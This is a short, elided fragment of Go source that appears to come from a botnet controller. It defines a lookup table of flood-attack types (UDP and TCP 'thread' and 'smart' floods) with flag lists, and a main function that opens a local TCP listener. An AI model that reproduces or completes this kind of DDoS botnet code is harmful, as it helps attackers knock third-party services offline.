...
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
	...
	"udpthread": AttackInfo{
		3,
		[]uint8{0, 1, 7, 27},
		"",
	},
	"tcpthread": AttackInfo{
		4,
		[]uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 27},
		"",
	},
	"udpsmart": AttackInfo{
		5,
...
func main() {
	...
	listen, err := net.Listen("tcp", "127.0.0.1:56412")
	if err != nil {
		fmt.Println(err)
		return
	}
